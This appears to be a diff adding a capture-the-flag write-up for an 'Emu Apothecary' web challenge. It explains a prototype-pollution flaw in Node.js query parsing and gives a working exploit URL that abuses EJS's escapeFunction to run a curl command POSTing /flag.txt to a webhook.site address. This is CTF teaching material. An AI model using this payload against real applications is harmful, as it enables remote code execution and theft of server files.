@@ -599,12 +599,55 @@ UWA{Dir_Trav3rs@l_Flight}
 
 ## Emu Apothecary
 ### Step 1
-A clear, and detailed description.  
-
+#### Analyze Input and URL Changes:
+I put 1,2,3 respectively into the field of `Ingredient Name`, `Amount`, `Type of Amount`.
+After submitting the form, the URL changed to: 'http://34.87.251.234:8001/?1.type=3&1.value=2'.
+This indicates that the input fields are processed and appended as query parameters to the URL.
 ### Step 2
-### Step X
+#### Understand the Application Logic:
+I reviewed the provided js code to understand how user inputs are processed. The key parts of the code are:
+```
+for (const key in userInput) {
+    // Input is in the format of `{ingredientName}.{attribute}`
+    if (!key.includes(".")) continue
+    // Split the key name by the '.' character
+    const split = key.split('.')
+    // Set the attribute for the ingredient by the first two dots
+    // E.g. if the input is vinegar.type=mL it will set
+    // {"vinegar": {"type": "mL"}} in the baseIngredients variable
+    const ingredientName = split[0]
+    if (typeof baseIngredients[ingredientName] === "undefined") {
+        baseIngredients[ingredientName] = {}
+    }
+    const ingredientAttribute = split[1];
+    // Should be completely secure doing this???
+    // I don't think the hoomans can pollute anything by assigning attributes this way
+    // Yeah I am pretty sure this is not vulnerable to prototype pollution
+    // I am not merging anything right???
+    baseIngredients[ingredientName][ingredientAttribute] = userInput[key];
+}
+```
+This code snippet shows that user inputs are split by the `.` character, and then assigned to the `baseIngredients` object. By manipulating the input format, it's possible to inject properties into this object.
+### Step 3
+#### Exploit:
+##### Leveraging Prototype Pollution:
+By injecting properties into the `__proto__` object, we can potentially execute arbitrary code. We aim to use the escapeFunction property used by the EJS template engine.
+To execute the payload, I constructed a URL that modifies the `__proto__` properties:
+```
+http://34.87.251.234:8001/?__proto__.client=1&__proto__.escapeFunction=JSON.stringify;process.mainModule.require(%27child_process%27).exec(%27curl%20-X%20POST%20-F%20%22flag=@/flag.txt%22%20%20https://webhook.site/32962c2a-7c54-441d-82ad-4aa97c2370f6%27)
+```
+This URL does the following:
 
+Modifies the client property of `__proto__`.
+Sets the `escapeFunction` to `JSON.stringify`, bypassing the normal escaping mechanism.
+Executes a `curl` command to send the contents of `/flag.txt` to my webhook.
+```
+https://webhook.site/
+```
+(Webhook is a website that provides a unique URL for capturing and inspecting HTTP requests sent to it, commonly used for testing webhooks, HTTP requests, and debugging applications. I got my a website under my control from here: `	https://webhook.site/32962c2a-7c54-441d-82ad-4aa97c2370f6`.)
+
+By visiting the crafted URL, the injected payload was executed, and the contents of `/flag.txt` were sent to my webhook. The flag was successfully captured.
 #### Flag Found
 ```bash
-UWA{xxxxxxxxxx}
+UWA{p0LlUtInG_tH3_eMu5_r3CiP3_w33B5iT3!!1!}
 ```
